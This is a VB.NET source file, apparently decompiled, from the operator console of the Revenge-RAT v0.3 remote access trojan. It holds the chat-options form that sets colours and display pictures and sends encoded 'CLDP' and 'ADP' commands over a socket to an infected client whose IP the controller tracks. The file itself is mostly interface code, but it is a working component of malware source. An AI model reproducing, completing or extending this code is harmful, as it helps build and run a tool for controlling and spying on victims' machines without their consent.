Imports Microsoft.VisualBasic.CompilerServices
Imports System.IO
Imports Revenge_RAT_v0._3.RevengeRAT

Public Class CH_OP
    Public ADP As String
    Public CCS As String
    Public CDP As String
    Public Devices As Object
    Public FTT As String
    Public MC As String
    Public OS As Integer
    Public Sock As Integer

    Private Sub CD2_Click(sender As Object, e As EventArgs) Handles CD2.Click
        If (Me.ColorDialog1.ShowDialog = DialogResult.OK) Then
            Me.CCS = Me.ColorDialog1.Color.ToArgb.ToString
            Me.CC.ForeColor = Color.FromArgb(Conversions.ToInteger(Me.CCS))
        End If
    End Sub

    Private Sub CD_Click(sender As Object, e As EventArgs) Handles CD.Click
        If (Me.ColorDialog1.ShowDialog = DialogResult.OK) Then
            Me.MC = Me.ColorDialog1.Color.ToArgb.ToString
            Me.AC.ForeColor = Color.FromArgb(Conversions.ToInteger(Me.MC))
        End If
    End Sub

    Private Sub NE_Click(sender As Object, e As EventArgs) Handles NE.Click
        If (((((Me.FT.Text.Length = 0) Or (Me.AI.Text.Length = 0)) Or (Me.ADS.Text.Length = 0)) Or (Me.CI.Text.Length = 0)) Or (Me.CS.Text.Length = 0)) Then
            MessageBox.Show("You must add all information!", "Revenge-RAT v0.3", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
        Else
            Dim ch As New CH
            ch.Sock = Me.Sock
            ch.Name = ("Chat" & Conversions.ToString(Me.OS))
            ch.Text = ("Chating With : " & Me.FTT & " - " & My.Forms.Main.s.IP(Me.Sock))
            ch.Sock = Me.Sock
            ch.MeColor = Me.AC.ForeColor
            ch.ClinetColor = Me.CC.ForeColor
            ch.MeColorString = ch.MeColor.ToArgb.ToString
            ch.ClientColorString = ch.ClinetColor.ToArgb.ToString
            ch.ID = Conversions.ToString(SocketServer.Encode(Me.AI.Text))
            ch.CID = Conversions.ToString(SocketServer.Encode(Me.CI.Text))
            ch.FT = Conversions.ToString(SocketServer.Encode(Me.FT.Text))
            ch.Label1.Text = ("ID : " & Me.CI.Text)
            ch.Label2.Text = ("Status : " & Me.CS.Text)
            ch.ASS = Conversions.ToString(SocketServer.Encode(Me.ADS.Text))
            If (Not Me.RadioButton4.Checked AndAlso (Me.CDP <> Nothing)) Then
                ch.CLDP = Me.CDP
                My.Forms.Main.s.Send(Me.Sock, String.Concat(New String() {"CLDP", My.Forms.Main.Key, Me.CDP, My.Forms.Main.Key, Conversions.ToString(True)}))
            End If
            If (Not Me.RadioButton1.Checked AndAlso (Me.ADP <> Nothing)) Then
                ch.ADP = Me.ADP
                My.Forms.Main.s.Send(Me.Sock, String.Concat(New String() {"ADP", My.Forms.Main.Key, Me.ADP, My.Forms.Main.Key, Conversions.ToString(True)}))
            End If
            ch.OS = Me.OS
            ch.Devices = Conversions.ToString(Me.Devices)
            ch.Show()
            Me.Close()
        End If
    End Sub

    Private Sub RadioButton2_CheckedChanged(sender As Object, e As EventArgs) Handles RadioButton2.CheckedChanged
        If Me.RadioButton2.Checked Then
            Dim dialog As New OpenFileDialog
            Dim dialog2 As OpenFileDialog = dialog
            dialog.Title = "Select your display picture"
            dialog.Filter = "Display picture |*.png"
            dialog.ShowDialog()
            dialog2 = Nothing
            Try
                Me.ADP = Convert.ToBase64String(File.ReadAllBytes(dialog.FileName))
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Me.RadioButton1.Checked = True
                ProjectData.ClearProjectError()
            End Try
        End If
    End Sub

    Private Sub RadioButton3_CheckedChanged(sender As Object, e As EventArgs) Handles RadioButton3.CheckedChanged
        If Me.RadioButton3.Checked Then
            Dim dialog As New OpenFileDialog
            Dim dialog2 As OpenFileDialog = dialog
            dialog.Title = "Select client display picture"
            dialog.Filter = "Display picture |*.png"
            dialog.ShowDialog()
            dialog2 = Nothing
            Try
                Me.CDP = Convert.ToBase64String(File.ReadAllBytes(dialog.FileName))
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Me.RadioButton4.Checked = True
                ProjectData.ClearProjectError()
            End Try
        End If
    End Sub
End Class